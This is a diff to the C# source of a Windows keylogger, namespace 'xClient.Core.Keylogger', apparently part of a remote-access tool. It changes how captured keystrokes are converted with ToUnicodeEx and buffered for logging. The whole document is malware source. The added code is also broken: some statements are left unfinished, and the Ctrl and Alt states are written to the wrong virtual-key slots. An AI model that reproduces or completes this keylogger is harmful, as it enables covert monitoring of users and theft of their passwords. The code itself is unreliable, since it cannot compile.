@@ -134,29 +134,23 @@ namespace xClient.Core.Keylogger
             {
                 try
                 {
-                    if (k != null && !string.IsNullOrEmpty(k.PressedKey.GetKeyloggerKeyName()))
+                    if (k != null)
                     {
-                        if (k.PressedKey.IsSpecialKey())
-                        {
-                            // TODO: Re-Write this portion with the portion for when the timer elapses.
-
-                            //_logFileBuffer.Append(
-                            //    HighlightSpecialKey(((k.ModifierKeys.ShiftKeyPressed) ? "SHIFT-" : string.Empty) +
-                            //    ((k.ModifierKeys.CtrlKeyPressed) ? "CTRL-" : string.Empty) +
-                            //    ((k.ModifierKeys.AltKeyPressed) ? "ALT-" : string.Empty) +
-                            //    ((k.ModifierKeys.ShiftKeyPressed) ? "ESC-" : string.Empty) +
-                            //    FromKeys(k.PressedKey.KeyloggerKeyName(), k.ModifierKeys.ShiftKeyPressed, k.ModifierKeys.CapsLock)));
+                        if (k.ModifierKeys.ShiftKeyPressed && !(k.ModifierKeys.CtrlKeyPressed || k.ModifierKeys.AltKeyPressed))
+                        {_logFileBuffer.Append(HighlightSpecialKey(
                         }
-                    }
-                    else
-                    {
-                        _logFileBuffer.Append(FromKeys(k.PressedKey.GetKeyloggerKeyValue(), k.ModifierKeys.ShiftKeyPressed, k.ModifierKeys.CapsLock));
+                        else
+                        {
+                            if (k
+                            _logFileBuffer.Append(FromKeys(k));
+                        }
                     }
                 }
                 catch
                 { }
+
+                j++;
             }
-            j++;
 
             if (j > 0 && j <= _keyBuffer.Count)
             {
@@ -181,7 +175,7 @@ namespace xClient.Core.Keylogger
                 {
                     try
                     {
-                        LoggedKey KeyToLog = new LoggedKey() { PressedKey = (KeyloggerKeys)i };
+                        LoggedKey KeyToLog = new LoggedKey() { PressedKey = (KeyloggerKeys)(byte)i };
                         KeyToLog.RecordModifierKeys();
 
                         _keyBuffer.Add(KeyToLog);
@@ -274,23 +268,24 @@ namespace xClient.Core.Keylogger
             return Win32.GetKeyboardLayout(Win32.GetWindowThreadProcessId(Win32.GetForegroundWindow(), out pid));
         }
 
-        private char? FromKeys(int keys, bool shift, bool caps)
+        private char? FromKeys(LoggedKey key)
         {
             //keyStates is a byte array that specifies the current state of the keyboard and keys
             //The keys we are interested in are modifier keys such as shift and caps lock
-            var keyStates = new byte[256];
+            byte[] keyStates = new byte[256];
 
-            if (shift)
-                //keyStates[16] tells our ToUnicodeEx method the state of the shift key which is 0x80 (Key pressed down)
-                keyStates[16] = 0x80;
+            keyStates[(int)KeyloggerKeys.VK_SHIFT] = key.ModifierKeys.ShiftKeyPressed ? (byte)255 : (byte)0;
+            keyStates[(int)KeyloggerKeys.VK_MENU] = key.ModifierKeys.CtrlKeyPressed   ? (byte)255 : (byte)0;
+            keyStates[(int)KeyloggerKeys.VK_CONTROL] = key.ModifierKeys.AltKeyPressed ? (byte)255 : (byte)0;
 
-            if (caps)
-                //keyStates[20] tells our ToUnicodeEx method the state of the Capslock key which is 0x01 (Key toggled on)
-                keyStates[20] = 0x01;
+            // Hmmm... What is the toggle state of active as represented by a byte?
+            //keyStates[(int)KeyloggerKeys.VK_CAPITAL] = key.ModifierKeys.CapsLock  ? (byte)255 : (byte)0;
+            //keyStates[(int)KeyloggerKeys.VK_NUMLOCK] = key.ModifierKeys.NumLock   ? (byte)255 : (byte)0;
+            //keyStates[(int)KeyloggerKeys.VK_SCROLL] = key.ModifierKeys.ScrollLock ? (byte)255 : (byte)0;
 
             var sb = new StringBuilder(10);
 
-            return Win32.ToUnicodeEx(keys, 0, keyStates, sb, sb.Capacity, 0, GetActiveKeyboardLayout()) == 1
+            return Win32.ToUnicodeEx(key.PressedKey.GetKeyloggerKeyValue(), 0, keyStates, sb, sb.Capacity, 0, GetActiveKeyboardLayout()) == 1
                                      ? (char?)sb[0]
                                      : null;
         }
